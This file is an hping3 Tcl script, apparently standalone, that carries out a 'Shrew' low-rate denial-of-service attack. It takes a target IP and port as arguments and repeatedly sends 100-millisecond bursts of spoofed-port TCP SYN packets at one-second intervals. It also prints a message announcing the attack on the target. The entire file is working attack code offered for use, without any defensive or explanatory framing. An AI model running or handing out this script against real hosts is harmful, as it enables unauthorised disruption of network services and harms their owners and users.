#!/usr/bin/hping3 --tcl

# Load the standard library
source "hpingstdlib.htcl"

# Check if the correct number of arguments is provided
if {$argc < 2} {
    puts {usage: hping3 exec shrewattack.htcl target_ip target_port}
    exit 1
}

# Define the target IP address and port
set target_ip [lindex $argv 0]
set target_port [lindex $argv 1]

# Define the interval between bursts (in milliseconds)
set burst_interval 1000  ;# Interval between bursts (1 second)
set burst_duration 100   ;# Duration of each burst (100 milliseconds)

# Get the outgoing interface address
set outifaddr [hping outifa $target_ip]

# Function to send bursts of TCP packets
proc send_burst {} {
    global outifaddr target_ip target_port burst_duration
    
    set end_time [expr {[clock milliseconds] + $burst_duration}]
    while {[clock milliseconds] < $end_time} {
        # Construct the raw packet
        set probe "ip(saddr=$outifaddr,daddr=$target_ip,proto=6,ttl=255)"
        append probe " tcp(sport=[randport],dport=$target_port,flags=S,seq=0,ack=0,win=65535)"
        hping send $probe
    }
    after $::burst_interval send_burst
}

# Print start message
puts "Starting Shrew Attack on $target_ip:$target_port with burst interval $burst_interval ms and burst duration $burst_duration ms"

# Start sending bursts of TCP packets
after 0 send_burst

# Keep the script running
vwait forever
